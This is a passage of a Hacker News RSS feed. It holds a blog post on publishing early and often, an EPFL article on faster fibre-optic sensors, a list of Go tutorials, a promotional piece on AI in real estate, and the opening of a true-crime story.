  <p><a href="https://en.wikipedia.org/wiki/Release_early,_release_often">Release early, release often</a></p>
</blockquote>

<p>We release our products as early as we possibly can - while they only do the bare minimum and sometimes while they still have bugs. Then we make improvements fast.</p>

<p>This is for two reasons:</p>

<ol>
  <li>Because itâ€™s easy for new products to get caught up in a cycle of endless tweaking and never get released, and</li>
  <li>Once itâ€™s out in the world, you can start to see how much people actually like it. You have much more knowledge</li>
</ol>

<p>Why couldnâ€™t the same theory apply to blogging?</p>



<p>One reason to be careful about â€œreleasing earlyâ€� is the potential for reputational damage. If youâ€™re well known, releasing a sub-par product could tarnish your reputation.</p>

<p>So, if a blogger like myself was trying to build a reputation, and their success depended on this reputation, then you would want to be very careful about publishing sub-par content.</p>

<p>However, my experiene of blogging so far is that basically none of my readers know who I am. They find my posts through Google (other search engines are available), read that post, and bugger off. I suspect this is how most blogs are consumed.</p>

<p>Even if people find my articles through, say, my Twitter feed (where hopefully they at least vaguely know who I am), theyâ€™re still only going to click on the articles that look good to them.</p>

<p>If Iâ€™m right about this, it really doesnâ€™t matter how much crap content you produce, as long as you produce <em>some</em> good content. And if youâ€™ve written a bad article that no-one visits, you can always improve it later to make it a good one.</p>



<p>As I <a href="https://robinwinslow.uk/2020/11/13/i-am-a-blogger/">mentioned yesterday</a>, Iâ€™m currently trying to revive my blog. Iâ€™m going to do this by setting the bar for publishing content very low for myself, and hoping to publish daily. At least for a while.</p>

<p>Iâ€™m not going to spend a long time on editing, or let myself expect too much of my posts. Iâ€™m just going to do what I can.</p>

<p>This is my second post in 2 days. So far so good, I guess.</p>

<p>Letâ€™s see how it goes from here.</p>

</article></div>]]>
            </description>
            <link>https://robinwinslow.uk/2020/11/14/publish-early-publish-often/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25089952</guid>
            <pubDate>Sat, 14 Nov 2020 03:04:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-Locating Evidence and the Metaphysics of Time (2018) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25089721">thread link</a>) | @optimalsolver
<br/>
November 13, 2020 | https://www.davidbuiles.com/uploads/1/1/7/2/117238544/self-locating_evidence_and_the_metaphysics_of_time.pdf | <a href="https://web.archive.org/web/*/https://www.davidbuiles.com/uploads/1/1/7/2/117238544/self-locating_evidence_and_the_metaphysics_of_time.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.davidbuiles.com/uploads/1/1/7/2/117238544/self-locating_evidence_and_the_metaphysics_of_time.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25089721</guid>
            <pubDate>Sat, 14 Nov 2020 02:16:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Novel fiber optic sensors transmit data up to 100x faster]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25089079">thread link</a>) | @finphil
<br/>
November 13, 2020 | https://nuadox.com/post/634716239692955648/new-fiber-optics-100x-faster | <a href="https://web.archive.org/web/*/https://nuadox.com/post/634716239692955648/new-fiber-optics-100x-faster">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="634716239692955648">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/634716239692955648/new-fiber-optics-100x-faster"><h2>Novel fiber optic sensors transmit data up to 100x faster</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1080"><img src="https://64.media.tumblr.com/cf8f1259a9eee5b800a61b0d6cb930ae/1f0f992b620981dc-b3/s1280x1920/ff616593fe193d87f8e98b402b0f48dd8dcf9777.jpg" alt="image" data-orig-width="1920" data-orig-height="1080" width="1280" height="720"></figure><p><b>- By Clara Marc ,&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.epfl.ch%2Fen%2F&amp;t=ZTZiMzA2ZGVlYjNiNTM5YmJiODg0ZmU0NzZjYzQ1MmJmYWI5NmI2Nyx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605529668">École polytechnique fédérale de Lausanne (EPFL)</a> -</b></p><p>EPFL engineers have developed an advanced encoding and decoding system that allows fiber optic sensors to send data up to 100 times faster and over a wider area.</p><p>“Unlike conventional sensors that take measurements at a given point, like thermometers, fiber optic sensors record data all along a fiber,” says Luc Thévenaz, a professor at EPFL’s School of Engineering and head of the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.epfl.ch%2Flabs%2Fgfo%2F&amp;t=Mzg0YzNiZmE3MWFmMDg3MDM0YTM4MGI5YWE2MDZmZTRjNjZiYjRlMSx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605529668">Group for Fibre Optics (GFO)</a>. “But the technology has barely improved over the past few years.”</p><h2><b>Used widely in safety applications</b></h2><p>Fiber optic sensors are commonly used in hazard detection systems, such as to spot cracks in pipelines, identify deformations in civil engineering structures and detect potential landslides on mountain slopes. The sensors can take temperature readings everywhere a fiber is placed, thereby generating a continuous heat diagram of a given site – even if the site stretches for dozens of kilometers. That provides crucial insight into possible accidents before they happen.</p><h2><b>Improving signal quality</b></h2><p>Working in association with the <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fenglish.bupt.edu.cn%2F&amp;t=ZGRiMTFiZWZmZmVlZjdmYTgwMTNhNmM1MTA2OTYyMDVkYjZlYjY4Zix6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605529668">Beijing University of Posts and Telecommunications</a>, two GFO engineers – postdoc Zhisheng Yang and PhD student Simon Zaslawski – developed a new system for encoding and decoding data sent along the fibers. With their method, sensors can receive higher-energy signals and decode them faster, resulting in measurements taken more rapidly and over a larger area. Their research <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-020-19201-1&amp;t=OGFjMTg3ZGFiM2YzZWY2NjE5YzZmMTVmMTk3ODRjM2E0YzYzNDZmOSx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605529668">has just been published in <i>Nature Communications</i>.</a></p><p>The engineers describe their system as working like an echo. If you shout a single word, you hear that word back. But if you sing out a song, what you hear back is a blend of sounds that are hard to distinguish. You would need a “key” to decipher the sounds and make them intelligible. Fiber optic sensors function in a similar manner, except that an instrument sends out light pulses – rather than sounds – along a fiber. Signals bounce back up the fiber and a device decodes them, turning the signals into usable data.</p><p>To make the sensors more efficient, Yang and Zaslawski grouped the light pulses into sequences so that the signals bounce back with greater intensity. However, that didn’t solve the “echo” problem – that is, finding a key to make the signals readable. So they developed a method for encoding the data sent along a fiber; their method employs special genetic optimization algorithms to cope with imperfections. “Other systems are either limited in scope or expensive,” says Thévenaz. “But with ours, you just have to add a software program to your existing equipment. No need to adapt your sensors or use complex devices.”</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Factu.epfl.ch%2Fnews%2Fnew-fiber-optic-sensors-transmit-data-up-to-100-ti%2F&amp;t=NDZkMWVlNjQ1NDdiN2MxYjg5MjkxOWNmZWMzN2I4YjAzOTI5ODM1Yyx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605529668">École polytechnique fédérale de Lausanne (EPFL)</a></b></p><p><b>Full study:</b>&nbsp;“Genetic-optimised aperiodic code for distributed optical fibre sensors”, <i>Nature Communications</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1038%2Fs41467-020-19201-1&amp;t=OGUyZGY3ODdjMWFlOTRlMGM0MDkxNmFhNjVkYzNjZWE1MWYyZmMxZix6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605529668">https://doi.org/10.1038/s41467-020-19201-1</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/627187404240027648/world-record-internet-speed-record-set-by-ucl-scientists">New world record internet speed set</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/optics">optics</a>
                                    
                                        <a href="https://nuadox.com/tagged/materials">materials</a>
                                    
                                        <a href="https://nuadox.com/tagged/fiber-optics">fiber optics</a>
                                    
                                        <a href="https://nuadox.com/tagged/telecom">telecom</a>
                                    
                                        <a href="https://nuadox.com/tagged/sensors">sensors</a>
                                    
                                        <a href="https://nuadox.com/tagged/physics">physics</a>
                                    
                                        <a href="https://nuadox.com/tagged/featured">featured</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/634716239692955648/new-fiber-optics-100x-faster</link>
            <guid isPermaLink="false">hacker-news-small-sites-25089079</guid>
            <pubDate>Sat, 14 Nov 2020 00:14:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracking Hacker News sentiment towards Big Tech companies]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088966">thread link</a>) | @greatwave1
<br/>
November 13, 2020 | https://www.quiverquant.com/sources/hackernews | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/sources/hackernews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<p><a href="https://www.quiverquant.com/">
						<img src="https://www.quiverquant.com/static/img/logo.png" alt="">
					</a></p><p>Quiver scrapes alternative stock data from across the internet and aggregates it in a free, easy-to-use web dashboard.</p>
					<div>
						<p><span>Copyright © 2020 Quiver Quantitative, Inc. All rights reserved.</span></p><ul>
							<li><a href="https://www.quiverquant.com/privacypolicy">Privacy Policy</a></li>
							<li><a href="https://www.quiverquant.com/termsofservice">Terms of Service</a></li>
						</ul>
					</div>
				</div></div>]]>
            </description>
            <link>https://www.quiverquant.com/sources/hackernews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088966</guid>
            <pubDate>Fri, 13 Nov 2020 23:55:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play with Go]]>
            </title>
            <description>
<![CDATA[
Score 75 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25088913">thread link</a>) | @philosopher1234
<br/>
November 13, 2020 | https://play-with-go.dev/guides.html | <a href="https://web.archive.org/web/*/https://play-with-go.dev/guides.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <div>
        
        <p>
          A series of hands-on, interactive, browser-based guides that introduce the tools required to work with the Go programming language.
      </p></div>
      <div>
        <p><img src="https://play-with-go.dev/images/gopher.png">
        </p>
      </div>
    </div>


    

    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>An introduction to play-with-go.dev guides</h5>
            <p>Learn about how to get the most out of play-with-go.dev guides</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Get started with Go</h5>
            <p>You've completed the Go tour, so what next? This guide gives a brief introduction to Go programming</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Go fundamentals</h5>
            <p>Primer on creating and using go modules</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>Working with private modules</h5>
            <p>How to create, publish and work with non-public modules in your team.</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>How to use and tweak Staticcheck</h5>
            <p>Using static analysis to automatically find bugs and performance optimizations.</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Developer tools as module dependencies</h5>
            <p>Ensure all developers use the same version of each developer tool</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Installing Go</h5>
            <p>Ready to take the plunge and install Go on your system?!</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
    

    <div>
      
      <div>
        <div>
          <div>
            <h5>Installing Go programs directly</h5>
            <p>Simple easy-to-remember way to install Go programs</p>
            
            

          </div>
          
        </div>
      </div>
      
      <div>
        <div>
          <div>
            <h5>Retract Module Versions</h5>
            <p>Learn how to flag modules that shouldn't be used</p>
            
            

          </div>
          
        </div>
      </div>
      
    </div>
    
  </div>
  </div></div>]]>
            </description>
            <link>https://play-with-go.dev/guides.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088913</guid>
            <pubDate>Fri, 13 Nov 2020 23:45:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Artificial Intelligence is transforming strategies in the Real Estate business]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088859">thread link</a>) | @umermirzapk
<br/>
November 13, 2020 | https://thinkml.ai/how-artificial-intelligence-ai-use-is-transforming-approach-for-real-estate-property-business/ | <a href="https://web.archive.org/web/*/https://thinkml.ai/how-artificial-intelligence-ai-use-is-transforming-approach-for-real-estate-property-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


                <figure>
                    <img srcset="https://thinkml.ai/content/images/size/w300/2020/11/Real_Estate.jpg 300w,
                                https://thinkml.ai/content/images/size/w600/2020/11/Real_Estate.jpg 600w,
                                https://thinkml.ai/content/images/size/w1200/2020/11/Real_Estate.jpg 1000w,
                                https://thinkml.ai/content/images/size/w2000/2020/11/Real_Estate.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 1170px,
                                2000px" src="https://thinkml.ai/content/images/size/w2000/2020/11/Real_Estate.jpg" alt="How the use of Artificial Intelligence (AI) is transforming investment strategies in the Real Estate business">
                </figure>
                <section>
                    <div>
                        <p>The real estate business is one of the most money-making business in the world. According to MSCI, the global business volume of assets purchase was $8.9 trillion in 2018 which increased to $9.6 trillion in 2019. From consumer property buying and selling strategy to investments in developing commercial mega-projects, from urban town planning to building smart cities, AI is making its way to the real estate industry.</p><p>The real estate sector usually adopts innovation slower than other departments because of its reluctant attitude towards emerging technologies such as Artificial Intelligence. However, nowadays there is a <a href="https://www.forbes.com/sites/forbesrealestatecouncil/2019/08/21/how-artificial-intelligence-can-help-real-estate-investors-buy-and-sell-more-intelligently/?sh=2bb40b783479">significant positive trend in the strategy and approach among the entities involved in selling and purchasing of the property</a>. &nbsp;</p><p>AI utilization in the system will make it one of the advanced industries. AI has improved the home buying and selling experience for clients and agents. Real estate is known to be the second least improved industry globally according to <strong>the Morgan Stanley Digitization Index.</strong> The agent can focus on the customer’s needs and draw logical conclusions to offer them the right home. The CEOs of technology companies and development managers are focusing on learning AI concepts to adopt it in their systems.</p><p>The businesses have welcomed the AI with the core of heart as AI promised to handle repetitive and laborious tasks performed by humans. Applying <a href="https://thinkml.ai/fintech-cryptocurrency-ai-future-of-finance/">AI in business</a> was a turning point of this century that has changed the entire face of business processes.</p><p>Adopting technology in the real state is a slow process because, on average, people think to buy another property with a gap of five years. But it will ultimately be digital as marketers now prefer to upload pictures of the property with full details on the internet. The interested people find them with different search filters, including location and property size. Plus, advanced AI observes the buyer’s bank transactions to recommend properties according to their income. Any person doing a million-dollar or thousand-dollars business can efficiently find a compatible home with AI recommendations.</p><p>A common perception about AI is that it only works as robots in detecting faults, making corrections, and hence, leading humans. But in reality, Artificial Intelligence might work invisibly in a software system that leads to a considerable difference. A significant number of use cases are under-performing in multiple foundations for improving their status in the market. With continuous improvements and rising usage of AI, the ways of its exponential growth are also emerging.</p><h2 id="the-current-situation-of-ai-in-the-real-estate-market">The Current Situation of AI in the Real Estate Market</h2><p>The first AI-powered real estate transaction was made in 2018; it acquired two multi-family buildings for $26 million in Philadelphia. Then the algorithm, “<strong>soon to market detection</strong>” picked up this property to decide when it will be introduced in the market.</p><p>To understand how much beneficial is AI for real estate, thousands of data points were searched and adequately analyzed to provide such useful data, including:</p><ul><li>The financial value for a property</li><li>Major characteristics of a property</li><li>The chances of natural disaster in that particular area</li><li>State of that local real estate market</li><li>The number of houses released</li><li>And many more</li></ul><p>It’s the beginning of AI in the commercial real estate sector, and soon it will amaze this field with exciting new features. The CEO of Bractlet (infrastructure investment solution company), Alec Manfre, stated that:</p><blockquote>"Once we have the data, we have to find out what it means; for instance, how is the building currently operating? How to control the building? or is the building working rightly?”</blockquote><p>AI will also permit property owners to analyze how and where to invest their money. According to <strong>Manfre</strong>:</p><blockquote>"AI allows property owners to analyze how they need to invest in their buildings, where they can invest in, and what their returns are ultimately going to be."</blockquote><h2 id="how-is-ai-changing-the-real-estate-sector">How is AI Changing the Real Estate Sector?</h2><p>The large enterprises are focusing on working for the advancement in data organization. It will help to track fluctuating property prices from user-generated content for in-depth analysis and getting valuable insights. According to <strong>PwC, </strong>Artificial Intelligence will lead the global economy to $15.7 trillion by 2030. Software algorithms will evolve to deal with even problem areas like voice identification and <a href="https://thinkml.ai/top-10-ai-trends-in-banking/">decision-making strategy</a>. Ultimately, it will reduce the chances of errors leading to incorrect decisions because of the unavailability of required data.</p><p>AI is concerned with four basic categories:</p><p><strong>Automated Intelligence: </strong>It deals with programs, including routine, non-routine, cognitive, and manual matters.</p><p><strong>Expanding Intelligence: </strong>It allows humans to make the right decision.</p><p><strong>Supporting Intelligence: </strong>It makes it easier to do tasks at a faster rate with a high probability of accuracy.</p><p><strong>Autonomous Intelligence: </strong>It makes processes automated to eliminate the need for human assistance.</p><p>These AI factors in the real estate sector will improve operational efficiency and provide automated decision-making facilities. Moreover, these programs identify the patterns to make a connection between different components of big data sets.</p><p><strong>Information Management </strong>is the primary application of AI in the real estate industry. It can collect extensive data about the whole property or even a single building asset. A virtual data room is associated with it for storing documents, translating international transactions, and validating parameters in real-time.</p><h2 id="relevant-uses-of-ai-in-real-estate">Relevant Uses of AI in Real Estate</h2><p>AI tools help to improve the efficiency of stakeholders, asset managers, sellers, and brokers in the real estate industry. They also bring cost-effective solutions by eliminating the need for property management teams.</p><h3 id="1-intensifying-lead-generation-and-marketing">1) &nbsp;Intensifying Lead Generation and Marketing</h3><p>AI-enabled processes collect information about consumer data for improvement in <a href="https://thinkml.ai/top-10-ai-trends-to-watch-in-2021/">eCommerce businesses</a>. Furthermore, there are unique apps with machine-learning interfaces for the betterment of lead generation and marketing strategies. A content marketing specialist, <strong>Melanie Sovann, </strong>stated that:</p><blockquote>“A chatbot can become an amazing virtual assistant for your clients and a great way to deliver personalized content directly to leads.”</blockquote><p>If a person decided to run an ad regarding a new house listing in a fascinating location to target Millennials, he could do it in two ways:</p><p>Firstly, run a Facebook ad (traditional way) to attract an interested audience to the listing page. It will provide views and probably their email addresses.</p><p>Secondly, when a lead clicks on a Facebook ad, Facebook Messenger will instantly open up with a chatbot to answer his choirs. In this way, the person who showed interest in the ad will get subscribed to the chatbot’s newsletter and start receiving related content daily.</p><p>These chatbots ask the audience to fill out a particular form to collect data about target traffic; thus, help to get a more precise audience for the next turn. AI-enabled chatbots also ask questions from a lead like:</p><ul><li>What’s your price range?</li><li>What type of property do you need to sell, buy, or rent?</li><li>At what location you are interested?</li><li>And many others</li></ul><p><strong><a href="https://www.rexhomes.com/">REX</a> </strong>doesn’t use multiple property listings and charge only 2 percent from realtors and home-buyers that typically exceed five to six percent. It works with agents on salary-basis avoiding contract ship. The company involves in tracking users who click on the ad and their retention time on a website. Thus, its advanced AI system recommends ads to the audience according to their interest. Smart algorithms also track homeowner's data searches to estimate their buying capacities. It also identifies potential buyers by considering their activities on REX web-portals. The application finds user's preferences about a particular ad and then suggests them the right property in the right place in real-time.</p><h3 id="2-improve-home-search-for-clients">2) &nbsp;Improve Home Search for Clients</h3><p>Since home listings are available online for homebuyers to search online for homes with several filters, they can search for a particular location, cost, number of rooms, and square footage with many other customized options. But still, it leaves house hunters with lots of homes to check and makes it challenging to consider a single home.</p><p>Machine Learning helped in lessening this frustration; it analyses the human's search pattern to show similar results next time and create an accurate picture of the client's interest. <strong>Zillow, </strong>for instance, combines searches of potential property buyers and makes a list of properties that they search frequently or closely related to their search. It works similarly to <strong>Amazon </strong>as its quick deep learning system recommends more books to a buyer who’s interested in buying books.</p><p>Some AI-focused tools also have a conversational interface to answer frequent questions, including:</p><ul><li>How many cars fit in the garage?</li><li>Does the house have a pool?</li><li>Does the home have a backyard?</li></ul><p>The founder of <strong>West Realty Advisors</strong>, <strong>James Paine, </strong>share his statement:</p><blockquote>“When it comes to the real estate industry, the best way to get the best chance of securing a sale is to provide clients with the property that’s perfect for them. if an AI-based algorithm can help to surface the perfect properties for each different (portal) viewer, you’ll quickly become the go-to Realtor in tour area and beyond.”</blockquote><p><a href="https://www.trulia.com/"><strong>Trulia</strong></a><strong> </strong>is a Francisco-based company that aims to provide a perfect living place<strong> </strong>via<strong>an </strong>outstanding<strong> </strong>browsing experience. It comes with 35 filters and unique keyword research to offer the customer a highly personalized search. The app uses AI to memorize preferred items; for instance, it records wall color, paints, construction material, and even floor plans. It assembles data of all customers to recommend similar home selection options to the customer based on his interest. </p><h3 id="3-efficient-prediction-about-property-value">3) &nbsp;Efficient Prediction about Property Value</h3><p>Real estate businesses …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thinkml.ai/how-artificial-intelligence-ai-use-is-transforming-approach-for-real-estate-property-business/">https://thinkml.ai/how-artificial-intelligence-ai-use-is-transforming-approach-for-real-estate-property-business/</a></em></p>]]>
            </description>
            <link>https://thinkml.ai/how-artificial-intelligence-ai-use-is-transforming-approach-for-real-estate-property-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25088859</guid>
            <pubDate>Fri, 13 Nov 2020 23:38:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Blood House at Fountain Drive]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25088849">thread link</a>) | @gmays
<br/>
November 13, 2020 | https://www.trulyadventure.us/blood-house | <a href="https://web.archive.org/web/*/https://www.trulyadventure.us/blood-house">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
      

      

      <div>

        

        <div>
          
            
              
                
                  
                
              
            
          

          <main>
            
              <section data-content-field="main-content">
                <div data-type="page" data-updated-on="1603916914078" id="page-5f969048b0954566e6648ab0"><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1603712420375_14817"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603713899067-7GKXCM04PMINDVWH24XX/ke17ZwdGBToddI8pDm48kGZsbMQorZLBvTsrYytc7qF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0qqML2YsA4X4Bu62F5Escy-ebFkSk3GdcFVpBfDL4zgwQYGWHxsiBk8Z2WZNlx-X6A/blood+window.png" data-image="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603713899067-7GKXCM04PMINDVWH24XX/ke17ZwdGBToddI8pDm48kGZsbMQorZLBvTsrYytc7qF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0qqML2YsA4X4Bu62F5Escy-ebFkSk3GdcFVpBfDL4zgwQYGWHxsiBk8Z2WZNlx-X6A/blood+window.png" data-image-dimensions="2500x1963" data-image-focal-point="0.5,0.5" alt="blood window.png" data-load="false" data-image-id="5f96bb63d57b730851ab12d2" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603713899067-7GKXCM04PMINDVWH24XX/ke17ZwdGBToddI8pDm48kGZsbMQorZLBvTsrYytc7qF7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0qqML2YsA4X4Bu62F5Escy-ebFkSk3GdcFVpBfDL4zgwQYGWHxsiBk8Z2WZNlx-X6A/blood+window.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603714136218_16836"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603714804855-STJSCMRROT32PWS6H8VD/ke17ZwdGBToddI8pDm48kJyMJp3BLXV9spewM9jGYIZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIvCyUT5c-tqKVdOeHkxObxCvtsHsdqnbbJehy7V5kcag/title-red.png" data-image="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603714804855-STJSCMRROT32PWS6H8VD/ke17ZwdGBToddI8pDm48kJyMJp3BLXV9spewM9jGYIZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIvCyUT5c-tqKVdOeHkxObxCvtsHsdqnbbJehy7V5kcag/title-red.png" data-image-dimensions="864x303" data-image-focal-point="0.5,0.5" alt="title-red.png" data-load="false" data-image-id="5f96bef3d3bfb9134f0b8060" data-type="image" src="https://www.trulyadventure.us/title-red.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603714136218_15581"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603714774769-UUQRRGYIMV3B7RKRXO3O/ke17ZwdGBToddI8pDm48kJyMJp3BLXV9spewM9jGYIZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIvCyUT5c-tqKVdOeHkxObxCvtsHsdqnbbJehy7V5kcag/title-white.png" data-image="https://images.squarespace-cdn.com/content/v1/5a238ba10abd049ac5f4f02c/1603714774769-UUQRRGYIMV3B7RKRXO3O/ke17ZwdGBToddI8pDm48kJyMJp3BLXV9spewM9jGYIZZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIvCyUT5c-tqKVdOeHkxObxCvtsHsdqnbbJehy7V5kcag/title-white.png" data-image-dimensions="864x303" data-image-focal-point="0.5,0.5" alt="title-white.png" data-load="false" data-image-id="5f96bed65c1997215c386919" data-type="image" src="https://www.trulyadventure.us/title-white.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="23" id="block-yui_3_17_2_1_1603721172788_17212"><div><div><hr><p>Danny Cherry Jr. is a native of New Orleans. He has short stories published in <em>X-ray Lit Mag</em> &amp; <em>Literally Literary</em>, and non-fiction published at <em>The Daily Beast</em> and <em>Buzzfeed News</em>.</p><hr></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603721172788_37771"><div><p>It was late into a foggy Tuesday night in 1987 when the house on 1114 Fountain Drive in Atlanta, Georgia, began to bleed. One moment, all appeared as expected in this modest, quiet home. Then crimson fluid oozed down the white walls, seeped through the wooden hallway floors, splattered across the living room carpet, and found its way into almost every crack and crevice of the six-room brick residence.</p><p>Minnie Winston--77 with a thicket of grey-speckled hair--was soaking in the bathtub, a place to unwind and escape the stressors of caring for her husband. Her shoulders looked frail and birdlike, but they could carry more weight than her slight frame suggested. Life did not give Minnie much time for herself. Whatever turmoil existed in the outside world was just that now--<em>outside</em>. The house was locked and the alarm activated for the night, their sanctum holding only the two empty nesters.</p></div></div><div data-block-type="23" id="block-yui_3_17_2_1_1603808787151_134691"><div data-block-type="5" id="block-yui_3_17_2_1_1603724304384_70981"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
